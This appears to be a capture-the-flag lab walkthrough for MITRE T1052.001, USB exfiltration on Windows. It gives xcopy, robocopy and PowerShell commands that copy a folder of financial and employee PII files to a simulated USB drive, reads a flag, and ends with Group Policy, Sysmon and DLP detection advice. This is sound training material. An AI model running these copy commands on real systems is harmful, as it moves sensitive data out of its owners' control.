# T1052.001 – USB Exfiltration | Solution Walkthrough
**Difficulty:** Easy | **OS:** Windows | **MITRE:** T1052.001

## Step 1 – Identify Sensitive Data
```powershell
Get-ChildItem "C:\ProgramData\sensitive_docs" -Force
# financial_report.txt
# employee_pii.csv
Get-Content "C:\ProgramData\sensitive_docs\financial_report.txt"
```

## Step 2 – xcopy to USB
```cmd
xcopy "C:\ProgramData\sensitive_docs\*" "C:\SimulatedUSB_Drive\" /E /H /C /Y
REM /E = subdirs, /H = hidden files, /C = continue on error, /Y = no confirm
dir C:\SimulatedUSB_Drive\
```

## Step 3 – robocopy (More Reliable)
```cmd
robocopy "C:\ProgramData\sensitive_docs" "C:\SimulatedUSB_Drive" /E /COPYALL /R:0 /W:0 /NP
REM /E = all subdirs, /COPYALL = all file attributes, /NP = no progress
```

## Step 4 – PowerShell Recursive Copy
```powershell
Copy-Item "C:\ProgramData\sensitive_docs" -Destination "C:\SimulatedUSB_Drive" -Recurse -Force
Get-ChildItem "C:\SimulatedUSB_Drive" -Recurse
```

## Step 5 – Retrieve Flag
```powershell
Get-Content "C:\Windows\System32\flag_T1052_001.txt"
# HACKTIFY{USB_PHYSICAL_EXFIL_<hostname>}
```

## Detection & Prevention
- **Group Policy**: Computer → Administrative Templates → System → Removable Storage → Deny write access to removable disks
- **Sysmon Event 11** (file creation) on removable drives
- **DLP agents** monitoring file copies to removable media
